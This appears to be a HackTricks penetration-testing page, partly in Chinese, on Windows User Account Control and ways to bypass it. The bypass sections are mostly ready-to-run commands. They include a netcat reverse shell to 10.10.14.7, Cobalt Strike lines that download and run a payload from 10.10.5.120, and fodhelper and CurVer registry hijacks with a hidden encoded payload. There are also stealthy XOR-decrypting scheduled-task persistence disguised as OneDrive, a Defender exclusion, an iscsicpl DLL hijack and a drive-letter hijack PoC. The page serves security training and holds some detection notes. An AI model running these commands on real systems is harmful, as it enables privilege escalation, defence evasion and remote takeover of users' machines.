# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一个启用 **针对提升权限活动的 consent prompt** 的功能。Applications 具有不同的 `integrity` levels，具有 **high level** 的程序可以执行那些 **可能会 compromise system** 的任务。启用 UAC 时，Applications 和 tasks 始终 **在非管理员账户的 security context 下运行**，除非管理员显式授权这些 Applications/tasks 以 administrator-level access 在系统上运行。这是一个便利功能，用于保护 administrators 免受意外更改，但不被视为 security boundary。

有关 integrity levels 的更多信息：


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

当启用 UAC 时，administrator 用户会获得 2 个 token：一个 standard user key，用于以 regular level 执行常规操作；另一个带有 admin privileges。

此 [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 详细讨论了 UAC 的工作方式，包括 logon process、user experience 和 UAC architecture。Administrators 可以使用 security policies 配置 UAC 在本组织内本地的具体行为（使用 secpol.msc），也可以通过 Active Directory domain environment 中的 Group Policy Objects (GPO) 进行配置和下发。各项设置的详细说明在 [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)。UAC 可设置 10 个 Group Policy setting。下表提供了更多细节：

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Windows 上安装软件的 Policies

**local security policies**（大多数系统上的 "secpol.msc"）默认配置为 **阻止 non-admin users 执行软件安装**。这意味着即使 non-admin user 能够下载你软件的 installer，也无法在没有 admin account 的情况下运行它。

### 强制 UAC 询问提升权限的 Registry Keys

作为一个没有 admin rights 的 standard user，你可以确保当 "standard" 账户尝试执行某些操作时，会 **被 UAC 提示输入凭据**。此操作需要修改某些 **registry keys**，而这需要 admin permissions，除非存在 **UAC bypass**，或者 attacker 已经以 admin 身份登录。

即使用户属于 **Administrators** group，这些更改也会强制用户 **重新输入其账户凭据**，以执行 administrative actions。

**唯一的缺点是，这种方法需要在 UAC disabled 的情况下才能工作，而在 production environments 中这种情况不太可能发生。**

你必须修改的 registry keys 和条目如下（括号中为默认值）：

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

这也可以通过 Local Security Policy tool 手动完成。更改后，administrative operations 会提示用户重新输入其凭据。

### Note

**User Account Control 不是 security boundary。** 因此，standard users 不能在没有 local privilege escalation exploit 的情况下突破其账户并获得 administrator rights。

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode uses integrity checks to prevent high-integrity-level processes (like web browsers) from accessing low-integrity-level data (like the temporary Internet files folder). This is done by running the browser with a low-integrity token. When the browser attempts to access data stored in the low-integrity zone, the operating system checks the integrity level of the process and allows access accordingly. This feature helps prevent remote code execution attacks from gaining access to sensitive data on the system.
- 当用户登录到 Windows 时，系统会创建一个 access token，其中包含该用户的 privileges 列表。Privileges 定义为用户 rights 和 capabilities 的组合。该 token 还包含该用户的 credentials 列表，这些 credentials 用于向计算机以及网络上的资源验证用户身份。

### Autoadminlogon

To configure Windows to automatically log on a specific user at startup, set the **`AutoAdminLogon` registry key**. This is useful for kiosk environments or for testing purposes. Use this only on secure systems, as it exposes the password in the registry.

Set the following keys using the Registry Editor or `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

To revert to normal logon behavior, set `AutoAdminLogon` to 0.

## UAC bypass

> [!TIP]
> Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears

The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.

It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**

### UAC disabled

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### 通过 token duplication 绕过 UAC

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常** 基础的 UAC "bypass"（完整文件系统访问）

如果你有一个 shell，且当前用户在 Administrators 组中，你可以将通过 SMB（file system）共享的 **C$** 挂载到本地为一个新磁盘，这样你就会获得对 **文件系统内所有内容的访问权限**（甚至包括 Administrator 的 home folder）。

> [!WARNING]
> **看起来这个技巧已经不再有效了**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### 使用 cobalt strike 绕过 UAC

Cobalt Strike techniques 只有在 UAC 没有设置到最高安全级别时才会生效
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** and **Metasploit** 也有几个模块可以 **bypass** **UAC**。

### KRBUACBypass

Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)是多个 UAC bypass exploits 的 **compilation**。注意，你需要使用 visual studio 或 msbuild 来 **compile UACME**。编译后会生成多个可执行文件（例如 `Source\Akagi\outout\x64\Debug\Akagi.exe`），你需要知道**自己需要哪一个。**\
你应该**小心**，因为某些 bypass 会**promtp** 其他程序，从而**alert** **user**，让其知道正在发生某些事情。

UACME 提供了每种 technique **开始生效的 build version**。你可以搜索影响你版本的 technique：
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC 绕过 – fodhelper.exe (Registry hijack)

受信任的二进制文件 `fodhelper.exe` 在现代 Windows 上会自动提权。启动时，它会查询下面的 per-user registry path，而不会验证 `DelegateExecute` 动词。在这里放置一个 command，可以让 Medium Integrity process（用户属于 Administrators）在不触发 UAC prompt 的情况下启动一个 High Integrity process。

由 fodhelper 查询的 Registry path:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell 步骤（设置你的 payload，然后触发）</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes:
- Works when the current user is a member of Administrators and UAC level is default/lenient (not Always Notify with extra restrictions).
- Use the `sysnative` path to start a 64-bit PowerShell from a 32-bit process on 64-bit Windows.
- Payload can be any command (PowerShell, cmd, or an EXE path). Avoid prompting UIs for stealth.

#### CurVer/extension hijack variant (HKCU only)

最近利用 `fodhelper.exe` 的样本会避免使用 `DelegateExecute`，而是通过 per-user `CurVer` 值**重定向 `ms-settings` ProgID**。这个 auto-elevated 二进制仍然会在 `HKCU` 下解析 handler，所以不需要 admin token 就能植入这些 key：
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
一旦提权，malware 通常会通过将 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` 设置为 `0` 来**禁用未来的提示**，然后执行额外的 defense evasion（例如，`Add-MpPreference -ExclusionPath C:\ProgramData`），并重新创建 persistence 以 high integrity 运行。一个典型的 persistence 任务会将一个**XOR-encrypted PowerShell script**存储在磁盘上，并每小时在内存中解码/执行它：
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
这个变体仍然会清理 dropper，并只保留 staged payloads，因此检测要依赖于监控 **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` 篡改、Defender exclusion 创建，或会在内存中解密 PowerShell 的 scheduled tasks。

#### 更多 UAC bypass

这里使用的**所有**技术来 bypass AUC **都需要**与受害者的一个**完整交互式 shell**（普通的 nc.exe shell 不够）。

你可以通过 **meterpreter** 会话获得。迁移到一个 **Session** 值等于 **1** 的 **process**：

![](<../../images/image (863).png>)

(_explorer.exe_ 应该可以工作)

### 使用 GUI 的 UAC Bypass

如果你有 **GUI** 访问权限，你其实只要在弹出 UAC 提示时直接接受就行了，不真的需要 bypass。也就是说，拿到 GUI 访问权限就能让你 bypass UAC。

此外，如果你获得的是别人正在使用的 GUI 会话（可能通过 RDP），会有**一些工具会以 administrator 身份运行**，你可以直接从那里**运行**一个例如 **cmd** 的程序，**以 admin 身份**直接运行，而不会再次被 UAC 提示，比如 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这可能会更**stealthy**一些。

### 噪声较大的暴力 UAC bypass

如果你不介意噪声，你总是可以**运行类似** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) 这样的工具，它会**请求提升权限，直到用户同意为止**。

### 你自己的 bypass - 基础 UAC bypass 方法论

如果你看一下 **UACME**，你会注意到**大多数 UAC bypass 都滥用了 Dll Hijacking 漏洞**（主要是把恶意 dll 写到 _C:\Windows\System32_）。[阅读这里了解如何找到 Dll Hijacking 漏洞](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. 找一个会 **autoelevate** 的 binary（确认它执行时会以 high integrity level 运行）。
2. 用 procmon 找到可以被 **DLL Hijacking** 利用的 "**NAME NOT FOUND**" 事件。
3. 你很可能需要把 DLL **写入** 一些**受保护路径**（比如 C:\Windows\System32），而你没有写权限。你可以通过以下方式绕过：
1. **wusa.exe**：Windows 7、8 和 8.1。它允许把 CAB 文件内容提取到受保护路径中（因为这个工具是以高 integrity level 执行的）。
2. **IFileOperation**：Windows 10。
4. 准备一个 **script**，把你的 DLL 复制到受保护路径中，并执行 vulnerable 且 autoelevated 的 binary。

### 另一种 UAC bypass 技术

核心是观察一个 **autoElevated binary** 是否会从 **registry** 中**读取**某个将要被**执行**的 **binary** 或 **command** 的**名字/路径**（如果这个 binary 是在 **HKCU** 中查找这些信息，就更有意思）。

### 通过 `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack 的 UAC bypass

32 位的 `C:\Windows\SysWOW64\iscsicpl.exe` 是一个 **auto-elevated** binary，可以通过搜索顺序去加载 `iscsiexe.dll`。如果你能把恶意的 `iscsiexe.dll` 放到一个**用户可写**目录中，然后修改当前用户的 `PATH`（例如通过 `HKCU\Environment\Path`）让该目录被搜索，Windows 可能会在提升权限的 `iscsicpl.exe` process 中加载攻击者的 DLL，**而不显示 UAC 提示**。

实用说明：
- 当当前用户属于 **Administrators** 但由于 UAC 以 **Medium Integrity** 运行时，这个方法很有用。
- 这里用于 bypass 的是 **SysWOW64** 版本。请把 **System32** 版本视为一个单独的 binary，并独立验证其行为。
- 这个原语结合了 **auto-elevation** 和 **DLL search-order hijacking**，所以用于验证缺失 DLL 加载的同一套 ProcMon 工作流也很有用。

最小流程：
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- Alert on `reg add` / registry writes to `HKCU\Environment\Path` immediately followed by execution of `C:\Windows\SysWOW64\iscsicpl.exe`.
- Hunt for `iscsiexe.dll` in **user-controlled** locations such as `%TEMP%` or `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlate `iscsicpl.exe` launches with unexpected child processes or DLL loads from outside the normal Windows directories.

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.

**Steps:**

1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
